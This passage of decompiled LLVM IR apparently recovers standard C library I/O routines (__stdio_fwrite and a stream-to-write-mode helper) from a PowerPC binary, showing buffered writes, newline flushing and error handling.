  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10011f34, i32* @r31, align 4
  %v3_10011f483 = icmp eq i32 %v0_10011f34, 0
  store i32 %v0_10011f34, i32* @r27, align 4
  br i1 %v3_10011f483, label %dec_label_pc_10011ff0, label %dec_label_pc_10011f58

dec_label_pc_10011f58:                            ; preds = %entry, %dec_label_pc_10011f78
  %v0_10011f68 = phi i32 [ %v2_10011f78, %dec_label_pc_10011f78 ], [ %arg2, %entry ]
  %v1_10011f58.in = phi i32 [ %v2_10011f7c, %dec_label_pc_10011f78 ], [ %v0_10011f34, %entry ]
  %v1_10011f58 = icmp sgt i32 %v1_10011f58.in, 0
  br i1 %v1_10011f58, label %dec_label_pc_10011f64, label %dec_label_pc_10011f5c

dec_label_pc_10011f5c:                            ; preds = %dec_label_pc_10011f58
  br label %dec_label_pc_10011f64

dec_label_pc_10011f64:                            ; preds = %dec_label_pc_10011f58, %dec_label_pc_10011f5c
  %v0_10011f64 = load i32, i32* @r30, align 4
  %v1_10011f64 = add i32 %v0_10011f64, 4
  %v2_10011f64 = inttoptr i32 %v1_10011f64 to i32*
  %v3_10011f64 = load i32, i32* %v2_10011f64, align 4
  store i32 268509040, i32* @lr, align 4
  %v3_10011f6c = call i32 @__libc_write(i32 %v3_10011f64, i32 %v0_10011f68)
  %v1_10011f70 = icmp slt i32 %v3_10011f6c, 0
  br i1 %v1_10011f70, label %dec_label_pc_10011f84, label %dec_label_pc_10011f78

dec_label_pc_10011f78:                            ; preds = %dec_label_pc_10011f64
  %v0_10011f78 = load i32, i32* @r29, align 4
  %v2_10011f78 = add i32 %v0_10011f78, %v3_10011f6c
  store i32 %v2_10011f78, i32* @r29, align 4
  %v1_10011f7c = load i32, i32* @r31, align 4
  %v2_10011f7c = sub i32 %v1_10011f7c, %v3_10011f6c
  store i32 %v2_10011f7c, i32* @r31, align 4
  %v3_10011f48 = icmp eq i32 %v2_10011f7c, 0
  store i32 %v2_10011f7c, i32* @r27, align 4
  br i1 %v3_10011f48, label %dec_label_pc_10011f48.dec_label_pc_10011ff0.loopexit_crit_edge, label %dec_label_pc_10011f58

dec_label_pc_10011f84:                            ; preds = %dec_label_pc_10011f64
  %v0_10011f84 = load i32, i32* @r30, align 4
  %v1_10011f84 = add i32 %v0_10011f84, 8
  %v2_10011f84 = inttoptr i32 %v1_10011f84 to i32*
  %v3_10011f84 = load i32, i32* %v2_10011f84, align 4
  store i32 %v3_10011f84, i32* %r11.global-to-local, align 4
  %v1_10011f88 = add i32 %v0_10011f84, 12
  %v2_10011f88 = inttoptr i32 %v1_10011f88 to i32*
  %v3_10011f88 = load i32, i32* %v2_10011f88, align 4
  store i32 %v3_10011f88, i32* %r0.global-to-local, align 4
  %v1_10011f8c = inttoptr i32 %v0_10011f84 to i16*
  %v2_10011f8c = load i16, i16* %v1_10011f8c, align 2
  %v2_10011f90 = sub i32 %v3_10011f88, %v3_10011f84
  store i32 %v2_10011f90, i32* %r0.global-to-local, align 4
  %v5_10011f90 = icmp eq i32 %v2_10011f90, 0
  %v1_10011f94 = or i16 %v2_10011f8c, 8
  store i16 %v1_10011f94, i16* %v1_10011f8c, align 2
  br i1 %v5_10011f90, label %dec_label_pc_10011f84.dec_label_pc_10011fec_crit_edge, label %dec_label_pc_10011fa0

dec_label_pc_10011f84.dec_label_pc_10011fec_crit_edge: ; preds = %dec_label_pc_10011f84
  %v0_10011fec.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011fec

dec_label_pc_10011fa0:                            ; preds = %dec_label_pc_10011f84
  %v0_10011fa0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011fa0 = load i32, i32* @r31, align 4
  %v3_10011fa0 = icmp ugt i32 %v0_10011fa0, %v1_10011fa0
  br i1 %v3_10011fa0, label %dec_label_pc_10011fa0.dec_label_pc_10011fac_crit_edge, label %dec_label_pc_10011fa8

dec_label_pc_10011fa0.dec_label_pc_10011fac_crit_edge: ; preds = %dec_label_pc_10011fa0
  %v0_10011fac.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10011fac

dec_label_pc_10011fa8:                            ; preds = %dec_label_pc_10011fa0
  store i32 %v0_10011fa0, i32* @r27, align 4
  br label %dec_label_pc_10011fac

dec_label_pc_10011fac:                            ; preds = %dec_label_pc_10011fa0.dec_label_pc_10011fac_crit_edge, %dec_label_pc_10011fa8
  %v0_10011fac = phi i32 [ %v0_10011fac.pre, %dec_label_pc_10011fa0.dec_label_pc_10011fac_crit_edge ], [ %v0_10011fa0, %dec_label_pc_10011fa8 ]
  store i32 %v0_10011fac, i32* %ctr.global-to-local, align 4
  %v2_10011fb8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011fb0

dec_label_pc_10011fb0:                            ; preds = %dec_label_pc_10011fd4, %dec_label_pc_10011fac
  %v2_10011fb8 = phi i32 [ %v1_10011fd4, %dec_label_pc_10011fd4 ], [ %v2_10011fb8.pre, %dec_label_pc_10011fac ]
  %v0_10011fb0 = load i32, i32* @r29, align 4
  %v1_10011fb0 = inttoptr i32 %v0_10011fb0 to i8*
  %v2_10011fb0 = load i8, i8* %v1_10011fb0, align 1
  %v3_10011fb0 = zext i8 %v2_10011fb0 to i32
  store i32 %v3_10011fb0, i32* %r0.global-to-local, align 4
  %v1_10011fb4 = add i32 %v0_10011fb0, 1
  store i32 %v1_10011fb4, i32* @r29, align 4
  %v3_10011fb8 = inttoptr i32 %v2_10011fb8 to i8*
  store i8 %v2_10011fb0, i8* %v3_10011fb8, align 1
  %v0_10011fbc = load i32, i32* %r0.global-to-local, align 4
  %v1_10011fbc = urem i32 %v0_10011fbc, 256
  store i32 %v1_10011fbc, i32* %r0.global-to-local, align 4
  %v3_10011fc0 = icmp eq i32 %v1_10011fbc, 10
  br i1 %v3_10011fc0, label %dec_label_pc_10011fc8, label %dec_label_pc_10011fd4

dec_label_pc_10011fc8:                            ; preds = %dec_label_pc_10011fb0
  %v0_10011fc8 = load i32, i32* @r30, align 4
  %v1_10011fc8 = inttoptr i32 %v0_10011fc8 to i16*
  %v2_10011fc8 = load i16, i16* %v1_10011fc8, align 2
  %v3_10011fc8 = zext i16 %v2_10011fc8 to i32
  store i32 %v3_10011fc8, i32* %r0.global-to-local, align 4
  %v1_10011fcc = and i32 %v3_10011fc8, 256
  %v3_10011fcc = icmp eq i32 %v1_10011fcc, 0
  br i1 %v3_10011fcc, label %dec_label_pc_10011fd4, label %dec_label_pc_10011fc8.dec_label_pc_10011fdc_crit_edge

dec_label_pc_10011fc8.dec_label_pc_10011fdc_crit_edge: ; preds = %dec_label_pc_10011fc8
  %v0_10011fe0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011fdc

dec_label_pc_10011fd4:                            ; preds = %dec_label_pc_10011fc8, %dec_label_pc_10011fb0
  %v0_10011fd4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011fd4 = add i32 %v0_10011fd4, 1
  store i32 %v1_10011fd4, i32* %r11.global-to-local, align 4
  %v0_10011fd8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011fd8 = add i32 %v0_10011fd8, -1
  store i32 %v1_10011fd8, i32* %ctr.global-to-local, align 4
  %v2_10011fd8 = icmp eq i32 %v1_10011fd8, 0
  br i1 %v2_10011fd8, label %dec_label_pc_10011fd4.dec_label_pc_10011fdc_crit_edge, label %dec_label_pc_10011fb0

dec_label_pc_10011fd4.dec_label_pc_10011fdc_crit_edge: ; preds = %dec_label_pc_10011fd4
  %v0_10011fdc.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10011fdc

dec_label_pc_10011fdc:                            ; preds = %dec_label_pc_10011fc8.dec_label_pc_10011fdc_crit_edge, %dec_label_pc_10011fd4.dec_label_pc_10011fdc_crit_edge
  %v0_10011fe0 = phi i32 [ %v1_10011fd4, %dec_label_pc_10011fd4.dec_label_pc_10011fdc_crit_edge ], [ %v0_10011fe0.pre, %dec_label_pc_10011fc8.dec_label_pc_10011fdc_crit_edge ]
  %v0_10011fdc = phi i32 [ %v0_10011fdc.pre, %dec_label_pc_10011fd4.dec_label_pc_10011fdc_crit_edge ], [ %v0_10011fc8, %dec_label_pc_10011fc8.dec_label_pc_10011fdc_crit_edge ]
  %v1_10011fdc = add i32 %v0_10011fdc, 8
  %v2_10011fdc = inttoptr i32 %v1_10011fdc to i32*
  %v3_10011fdc = load i32, i32* %v2_10011fdc, align 4
  store i32 %v3_10011fdc, i32* %r0.global-to-local, align 4
  %v2_10011fe0 = add i32 %v0_10011fdc, 16
  %v3_10011fe0 = inttoptr i32 %v2_10011fe0 to i32*
  store i32 %v0_10011fe0, i32* %v3_10011fe0, align 4
  %v0_10011fe4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011fe4 = load i32, i32* %r11.global-to-local, align 4
  %v2_10011fe4 = sub i32 %v1_10011fe4, %v0_10011fe4
  store i32 %v2_10011fe4, i32* %r0.global-to-local, align 4
  %v1_10011fe8 = load i32, i32* @r31, align 4
  %v2_10011fe8 = sub i32 %v1_10011fe8, %v2_10011fe4
  store i32 %v2_10011fe8, i32* @r31, align 4
  br label %dec_label_pc_10011fec

dec_label_pc_10011fec:                            ; preds = %dec_label_pc_10011f84.dec_label_pc_10011fec_crit_edge, %dec_label_pc_10011fdc
  %v0_10011fec = phi i32 [ %v0_10011fec.pre, %dec_label_pc_10011f84.dec_label_pc_10011fec_crit_edge ], [ %v2_10011fe8, %dec_label_pc_10011fdc ]
  %v1_10011fec = load i32, i32* @r28, align 4
  %v2_10011fec = sub i32 %v1_10011fec, %v0_10011fec
  store i32 %v2_10011fec, i32* @r28, align 4
  br label %dec_label_pc_10011ff0

dec_label_pc_10011f48.dec_label_pc_10011ff0.loopexit_crit_edge: ; preds = %dec_label_pc_10011f78
  %v0_10011ff4.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10011ff0

dec_label_pc_10011ff0:                            ; preds = %entry, %dec_label_pc_10011f48.dec_label_pc_10011ff0.loopexit_crit_edge, %dec_label_pc_10011fec
  %v0_10011ff4 = phi i32 [ %v2_10011fec, %dec_label_pc_10011fec ], [ %v0_10011ff4.pre.pre, %dec_label_pc_10011f48.dec_label_pc_10011ff0.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_10011f28, i32* %r0.global-to-local, align 4
  ret i32 %v0_10011ff4

; uselistorder directives
  uselistorder i32 %v0_10011fdc, { 1, 0 }
  uselistorder i32 %v1_10011fd8, { 1, 0 }
  uselistorder i32 %v1_10011fd4, { 0, 2, 1 }
  uselistorder i32 %v1_10011fbc, { 1, 0 }
  uselistorder i32 %v2_10011f7c, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10011f78, { 1, 0 }
  uselistorder i32 %v3_10011f6c, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5 }
  uselistorder i32 (i32, i32)* @__libc_write, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10011ff0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011fec, { 1, 0 }
  uselistorder label %dec_label_pc_10011fdc, { 1, 0 }
  uselistorder label %dec_label_pc_10011fac, { 1, 0 }
  uselistorder label %dec_label_pc_10011f64, { 1, 0 }
  uselistorder label %dec_label_pc_10011f58, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_10012008 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_10012024 = load i16, i16* %arg3, align 2
  %v1_10012028 = and i16 %v3_10012024, 512
  %v3_10012028 = icmp eq i16 %v1_10012028, 0
  br i1 %v3_10012028, label %dec_label_pc_10012030, label %dec_label_pc_1001213c

dec_label_pc_10012030:                            ; preds = %entry
  %v2_10012030 = add i32 %tmp, 4
  %v3_10012030 = inttoptr i32 %v2_10012030 to i32*
  %v4_10012030 = load i32, i32* %v3_10012030, align 4
  %v2_10012034 = add i32 %tmp, 16
  %v3_10012034 = inttoptr i32 %v2_10012034 to i32*
  %v4_10012034 = load i32, i32* %v3_10012034, align 4
  store i32 %v4_10012034, i32* @r3, align 4
  %v3_10012038 = icmp eq i32 %v4_10012030, -2
  %v2_1001203c = add i32 %tmp, 12
  %v3_1001203c = inttoptr i32 %v2_1001203c to i32*
  %v4_1001203c = load i32, i32* %v3_1001203c, align 4
  %v2_10012044 = sub i32 %v4_1001203c, %v4_10012034
  br i1 %v3_10012038, label %dec_label_pc_10012044, label %dec_label_pc_10012074

dec_label_pc_10012044:                            ; preds = %dec_label_pc_10012030
  %v3_1001204c = icmp ult i32 %v2_10012044, %arg2
  br i1 %v3_1001204c, label %dec_label_pc_10012054, label %dec_label_pc_10012058

dec_label_pc_10012054:                            ; preds = %dec_label_pc_10012044
  br label %dec_label_pc_10012058

dec_label_pc_10012058:                            ; preds = %dec_label_pc_10012044, %dec_label_pc_10012054
  %storemerge = phi i32 [ %v2_10012044, %dec_label_pc_10012054 ], [ %arg2, %dec_label_pc_10012044 ]
  %v0_1001205c = phi i32 [ %v2_10012044, %dec_label_pc_10012054 ], [ %arg2, %dec_label_pc_10012044 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_1001205c, i32* @r5, align 4
  store i32 268509284, i32* @lr, align 4
  %v0_10012060 = call i32 @memcpy()
  %v0_10012064 = load i32, i32* @r30, align 4
  %v1_10012064 = add i32 %v0_10012064, 16
  %v2_10012064 = inttoptr i32 %v1_10012064 to i32*
  %v3_10012064 = load i32, i32* %v2_10012064, align 4
  %v1_10012068 = load i32, i32* @r31, align 4
  %v2_10012068 = add i32 %v1_10012068, %v3_10012064
  store i32 %v2_10012068, i32* %v2_10012064, align 4
  br label %dec_label_pc_1001215c

dec_label_pc_10012074:                            ; preds = %dec_label_pc_10012030
  %v3_10012078 = icmp ult i32 %v2_10012044, %arg2
  br i1 %v3_10012078, label %dec_label_pc_10012118, label %dec_label_pc_10012080

dec_label_pc_10012080:                            ; preds = %dec_label_pc_10012074
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268509324, i32* @lr, align 4
  %v0_10012088 = call i32 @memcpy()
  %v0_1001208c = load i32, i32* @r30, align 4
  %v1_1001208c = inttoptr i32 %v0_1001208c to i16*
  %v2_1001208c = load i16, i16* %v1_1001208c, align 2
  %v1_10012090 = add i32 %v0_1001208c, 16
  %v2_10012090 = inttoptr i32 %v1_10012090 to i32*
  %v3_10012090 = load i32, i32* %v2_10012090, align 4
  %v1_10012094 = and i16 %v2_1001208c, 256
  %v3_10012094 = icmp eq i16 %v1_10012094, 0
  %v1_10012098 = load i32, i32* @r29, align 4
  %v2_10012098 = add i32 %v1_10012098, %v3_10012090
  store i32 %v2_10012098, i32* %v2_10012090, align 4
  br i1 %v3_10012094, label %dec_label_pc_1001215c, label %dec_label_pc_100120a4

dec_label_pc_100120a4:                            ; preds = %dec_label_pc_10012080
  %v0_100120a4 = load i32, i32* @r28, align 4
  %v0_100120ac = load i32, i32* @r29, align 4
  store i32 268509364, i32* @lr, align 4
  %v4_100120b0 = call i32 @memrchr(i32 %v0_100120a4, i32 10, i32 %v0_100120ac, i32 %v2_10012098)
  %v3_100120b4 = icmp eq i32 %v4_100120b0, 0
  br i1 %v3_100120b4, label %dec_label_pc_1001215c, label %dec_label_pc_100120bc

dec_label_pc_100120bc:                            ; preds = %dec_label_pc_100120a4
  %v0_100120bc = load i32, i32* @r30, align 4
  store i32 %v0_100120bc, i32* @r3, align 4
  store i32 268509380, i32* @lr, align 4
  %v0_100120c0 = call i32 @__stdio_wcommit()
  %v3_100120c4 = icmp eq i32 %v0_100120c0, 0
  br i1 %v3_100120c4, label %dec_label_pc_1001215c, label %dec_label_pc_100120cc

dec_label_pc_100120cc:                            ; preds = %dec_label_pc_100120bc
  %v0_100120cc = load i32, i32* @r29, align 4
  %v3_100120cc = icmp ugt i32 %v0_100120cc, %v0_100120c0
  %v0_100120c0.v0_100120d0 = select i1 %v3_100120cc, i32 %v0_100120c0, i32 %v0_100120cc
  store i32 %v0_100120c0.v0_100120d0, i32* @r31, align 4
  %v2_100120dc = sub i32 %v0_100120cc, %v0_100120c0.v0_100120d0
  %v0_100120e4 = load i32, i32* @r28, align 4
  %v2_100120e4 = add i32 %v0_100120e4, %v2_100120dc
  store i32 %v2_100120e4, i32* @r28, align 4
  store i32 %v2_100120e4, i32* @r3, align 4
  store i32 268509428, i32* @lr, align 4
  %v3_100120f0 = call i32 @__GI_memchr(i32 %v2_100120e4, i32 10, i32 %v0_100120c0.v0_100120d0)
  %v3_100120f4 = icmp eq i32 %v3_100120f0, 0
  br i1 %v3_100120f4, label %dec_label_pc_1001215c, label %dec_label_pc_100120fc

dec_label_pc_100120fc:                            ; preds = %dec_label_pc_100120cc
  %v0_100120fc = load i32, i32* @r30, align 4
  %v1_100120fc = add i32 %v0_100120fc, 16
  %v2_100120fc = inttoptr i32 %v1_100120fc to i32*
  %v3_100120fc = load i32, i32* %v2_100120fc, align 4
  %v0_10012100 = load i32, i32* @r28, align 4
  %v1_10012100 = load i32, i32* @r31, align 4
  %v2_10012100 = sub i32 %v0_10012100, %v3_100120f0
  %v2_10012104 = add i32 %v2_10012100, %v1_10012100
  %v2_10012108 = sub i32 %v3_100120fc, %v2_10012104
  %v1_1001210c = load i32, i32* @r29, align 4
  %v2_1001210c = sub i32 %v1_1001210c, %v2_10012104
  store i32 %v2_1001210c, i32* @r29, align 4
  store i32 %v2_10012108, i32* %v2_100120fc, align 4
  br label %dec_label_pc_1001215c

dec_label_pc_10012118:                            ; preds = %dec_label_pc_10012074
  %v2_10012118 = add i32 %tmp, 8
  %v3_10012118 = inttoptr i32 %v2_10012118 to i32*
  %v4_10012118 = load i32, i32* %v3_10012118, align 4
  %v4_1001211c = icmp eq i32 %v4_10012034, %v4_10012118
  br i1 %v4_1001211c, label %dec_label_pc_1001213c, label %dec_label_pc_10012124

dec_label_pc_10012124:                            ; preds = %dec_label_pc_10012118
  store i32 %tmp, i32* @r3, align 4
  store i32 268509484, i32* @lr, align 4
  %v0_10012128 = call i32 @__stdio_wcommit()
  %v3_1001212c = icmp eq i32 %v0_10012128, 0
  br i1 %v3_1001212c, label %dec_label_pc_10012124.dec_label_pc_1001213c_crit_edge, label %dec_label_pc_10012134

dec_label_pc_10012124.dec_label_pc_1001213c_crit_edge: ; preds = %dec_label_pc_10012124
  %v0_10012140.pre = load i32, i32* @r30, align 4
  %v0_10012144.pre = load i32, i32* @r28, align 4
  %v0_10012148.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001213c

dec_label_pc_10012134:                            ; preds = %dec_label_pc_10012124
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_1001215c

dec_label_pc_1001213c:                            ; preds = %dec_label_pc_10012124.dec_label_pc_1001213c_crit_edge, %entry, %dec_label_pc_10012118
  %v0_10012148 = phi i32 [ %v0_10012148.pre, %dec_label_pc_10012124.dec_label_pc_1001213c_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_10012118 ]
  %v0_10012144 = phi i32 [ %v0_10012144.pre, %dec_label_pc_10012124.dec_label_pc_1001213c_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_10012118 ]
  %v0_10012140 = phi i32 [ %v0_10012140.pre, %dec_label_pc_10012124.dec_label_pc_1001213c_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_10012118 ]
  %v1_10012140 = inttoptr i32 %v0_10012140 to i16*
  store i32 %v0_10012148, i32* @r5, align 4
  store i32 %v0_10012008, i32* @lr, align 4
  %v5_10012158 = call i32 @__stdio_WRITE(i16* %v1_10012140, i32 %v0_10012144)
  br label %dec_label_pc_1001215c

dec_label_pc_1001215c:                            ; preds = %dec_label_pc_100120cc, %dec_label_pc_100120bc, %dec_label_pc_100120a4, %dec_label_pc_10012080, %dec_label_pc_10012134, %dec_label_pc_100120fc, %dec_label_pc_10012058, %dec_label_pc_1001213c
  %v0_10012160 = load i32, i32* @r29, align 4
  ret i32 %v0_10012160

; uselistorder directives
  uselistorder i32 %v2_10012104, { 1, 0 }
  uselistorder i32 %v0_100120c0.v0_100120d0, { 0, 2, 1 }
  uselistorder i32 %v0_100120cc, { 1, 0, 2 }
  uselistorder i32 %v2_10012044, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1001215c, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_1001213c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10012058, { 1, 0 }
}

define i32 @__stdio_trans2w_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10012174 = load i32, i32* @lr, align 4
  store i32 %v0_10012174, i32* %r0.global-to-local, align 4
  %v0_1001217c = load i32, i32* @r31, align 4
  %v0_10012180 = load i32, i32* @r3, align 4
  store i32 %v0_10012180, i32* @r31, align 4
  %v1_10012188 = inttoptr i32 %v0_10012180 to i16*
  %v2_10012188 = load i16, i16* %v1_10012188, align 2
  %v3_10012188 = zext i16 %v2_10012188 to i32
  store i32 %v3_10012188, i32* %r0.global-to-local, align 4
  %v1_1001218c = load i32, i32* @r4, align 4
  %v2_1001218c = and i32 %v1_1001218c, %v3_10012188
  store i32 %v2_1001218c, i32* %r9.global-to-local, align 4
  %v5_1001218c = icmp eq i32 %v2_1001218c, 0
  br i1 %v5_1001218c, label %dec_label_pc_10012194, label %dec_label_pc_100121a4

dec_label_pc_10012194:                            ; preds = %entry
  %v1_10012194 = and i32 %v3_10012188, 2176
  store i32 %v1_10012194, i32* %r9.global-to-local, align 4
  %v3_10012194 = icmp eq i32 %v1_10012194, 0
  br i1 %v3_10012194, label %dec_label_pc_1001219c, label %dec_label_pc_100121b0

dec_label_pc_1001219c:                            ; preds = %dec_label_pc_10012194
  %v2_1001219c = or i32 %v1_1001218c, %v3_10012188
  store i32 %v2_1001219c, i32* %r0.global-to-local, align 4
  %v1_100121a0 = trunc i32 %v2_1001219c to i16
  store i16 %v1_100121a0, i16* %v1_10012188, align 2
  %v0_100121a4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100121a4

dec_label_pc_100121a4:                            ; preds = %entry, %dec_label_pc_1001219c
  %v0_100121e0 = phi i32 [ %v0_10012180, %entry ], [ %v0_100121a4.pre, %dec_label_pc_1001219c ]
  %v1_100121a4 = inttoptr i32 %v0_100121e0 to i16*
  %v2_100121a4 = load i16, i16* %v1_100121a4, align 2
  %v3_100121a4 = zext i16 %v2_100121a4 to i32
  %v1_100121a8 = and i32 %v3_100121a4, 32
  store i32 %v1_100121a8, i32* %r0.global-to-local, align 4
  %v3_100121a8 = icmp eq i32 %v1_100121a8, 0
  br i1 %v3_100121a8, label %dec_label_pc_100121d0, label %dec_label_pc_100121b0

dec_label_pc_100121b0:                            ; preds = %dec_label_pc_10012194, %dec_label_pc_100121a4
  %v0_100121b0 = call i32 @__errno_location()
  store i32 %v0_100121b0, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_100121b8 = inttoptr i32 %v0_100121b0 to i32*
  store i32 9, i32* %v2_100121b8, align 4
  br label %dec_label_pc_100121bc

dec_label_pc_100121bc:                            ; preds = %dec_label_pc_100121f8, %dec_label_pc_100121b0
  %v0_100121bc = load i32, i32* @r31, align 4
  %v1_100121bc = inttoptr i32 %v0_100121bc to i16*
  %v2_100121bc = load i16, i16* %v1_100121bc, align 2
  %v3_100121bc = zext i16 %v2_100121bc to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_100121c4 = or i32 %v3_100121bc, 8
  store i32 %v1_100121c4, i32* %r0.global-to-local, align 4
  %v1_100121c8 = trunc i32 %v1_100121c4 to i16
  store i16 %v1_100121c8, i16* %v1_100121bc, align 2
  br label %dec_label_pc_10012258

dec_label_pc_100121d0:                            ; preds = %dec_label_pc_100121a4
  %tmp = urem i16 %v2_100121a4, 4
  %v1_100121d0 = zext i16 %tmp to i32
  store i32 %v1_100121d0, i32* %r0.global-to-local, align 4
  %v3_100121d0 = icmp eq i16 %tmp, 0
  br i1 %v3_100121d0, label %dec_label_pc_10012234, label %dec_label_pc_100121d8

dec_label_pc_100121d8:                            ; preds = %dec_label_pc_100121d0
  %v1_100121d8 = and i32 %v3_100121a4, 4
  store i32 %v1_100121d8, i32* %r9.global-to-local, align 4
  %v3_100121d8 = icmp eq i32 %v1_100121d8, 0
  br i1 %v3_100121d8, label %dec_label_pc_100121e0, label %dec_label_pc_10012218

dec_label_pc_100121e0:                            ; preds = %dec_label_pc_100121d8
  %v1_100121e0 = add i32 %v0_100121e0, 20
  %v2_100121e0 = inttoptr i32 %v1_100121e0 to i32*
  %v3_100121e0 = load i32, i32* %v2_100121e0, align 4
  store i32 %v3_100121e0, i32* %r0.global-to-local, align 4
  %v1_100121e4 = add i32 %v0_100121e0, 16
  %v2_100121e4 = inttoptr i32 %v1_100121e4 to i32*
  %v3_100121e4 = load i32, i32* %v2_100121e4, align 4
  store i32 %v3_100121e4, i32* %r9.global-to-local, align 4
  %v4_100121e8 = icmp eq i32 %v3_100121e0, %v3_100121e4
  br i1 %v4_100121e8, label %dec_label_pc_100121f0, label %dec_label_pc_100121f8

dec_label_pc_100121f0:                            ; preds = %dec_label_pc_100121e0
  %v1_100121f0 = and i32 %v3_100121a4, 2
  store i32 %v1_100121f0, i32* %r0.global-to-local, align 4
  %v3_100121f0 = icmp eq i32 %v1_100121f0, 0
  br i1 %v3_100121f0, label %dec_label_pc_10012218, label %dec_label_pc_100121f8

dec_label_pc_100121f8:                            ; preds = %dec_label_pc_100121e0, %dec_label_pc_100121f0
  %v1_100121f8 = and i32 %v3_100121a4, 1024
  store i32 %v1_100121f8, i32* %r9.global-to-local, align 4
  %v0_10012200 = call i32 @__asm_mfcr()
  store i32 %v0_10012200, i32* %r3.global-to-local, align 4
  %v1_10012204 = call i32 @__asm_rlwinm(i32 %v0_10012200, i32 3, i32 31, i32 31)
  %v1_10012208 = sub i32 2, %v1_10012204
  store i32 %v1_10012208, i32* @r5, align 4
  store i32 268509712, i32* @lr, align 4
  %v1_1001220c = call i32 @__GI_fseek(i32 %v1_10012208)
  store i32 %v1_1001220c, i32* %r3.global-to-local, align 4
  %v3_10012210 = icmp eq i32 %v1_1001220c, 0
  br i1 %v3_10012210, label %dec_label_pc_100121f8.dec_label_pc_10012218_crit_edge, label %dec_label_pc_100121bc

dec_label_pc_100121f8.dec_label_pc_10012218_crit_edge: ; preds = %dec_label_pc_100121f8
  %v0_10012218.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012218

dec_label_pc_10012218:                            ; preds = %dec_label_pc_100121f8.dec_label_pc_10012218_crit_edge, %dec_label_pc_100121d8, %dec_label_pc_100121f0
  %v0_10012218 = phi i32 [ %v0_10012218.pre, %dec_label_pc_100121f8.dec_label_pc_10012218_crit_edge ], [ %v0_100121e0, %dec_label_pc_100121d8 ], [ %v0_100121e0, %dec_label_pc_100121f0 ]
  %v1_10012218 = inttoptr i32 %v0_10012218 to i16*
  %v2_10012218 = load i16, i16* %v1_10012218, align 2
  %v3_10012218 = zext i16 %v2_10012218 to i32
  store i32 %v3_10012218, i32* %r0.global-to-local, align 4
  %v1_1001221c = add i32 %v0_10012218, 8
  %v2_1001221c = inttoptr i32 %v1_1001221c to i32*
  %v3_1001221c = load i32, i32* %v2_1001221c, align 4
  store i32 %v3_1001221c, i32* %r9.global-to-local, align 4
  %v1_10012220 = call i32 @__asm_rlwinm(i32 %v3_10012218, i32 0, i32 0, i32 29)
  %v2_10012220 = trunc i32 %v1_10012220 to i16
  store i32 %v1_10012220, i32* %r0.global-to-local, align 4
  %v3_10012224 = load i32, i32* @r31, align 4
  %v4_10012224 = inttoptr i32 %v3_10012224 to i16*
  store i16 %v2_10012220, i16* %v4_10012224, align 2
  %v0_10012228 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012228 = load i32, i32* @r31, align 4
  %v2_10012228 = add i32 %v1_10012228, 20
  %v3_10012228 = inttoptr i32 %v2_10012228 to i32*
  store i32 %v0_10012228, i32* %v3_10012228, align 4
  %v0_1001222c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001222c = load i32, i32* @r31, align 4
  %v2_1001222c = add i32 %v1_1001222c, 24
  %v3_1001222c = inttoptr i32 %v2_1001222c to i32*
  store i32 %v0_1001222c, i32* %v3_1001222c, align 4
  %v0_10012230 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012230 = load i32, i32* @r31, align 4
  %v2_10012230 = add i32 %v1_10012230, 16
  %v3_10012230 = inttoptr i32 %v2_10012230 to i32*
  store i32 %v0_10012230, i32* %v3_10012230, align 4
  %v0_10012234.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012234

dec_label_pc_10012234:                            ; preds = %dec_label_pc_100121d0, %dec_label_pc_10012218
  %v2_10012240 = phi i32 [ %v0_100121e0, %dec_label_pc_100121d0 ], [ %v0_10012234.pre, %dec_label_pc_10012218 ]
  %v1_10012234 = inttoptr i32 %v2_10012240 to i16*
  %v2_10012234 = load i16, i16* %v1_10012234, align 2
  %v3_10012234 = zext i16 %v2_10012234 to i32
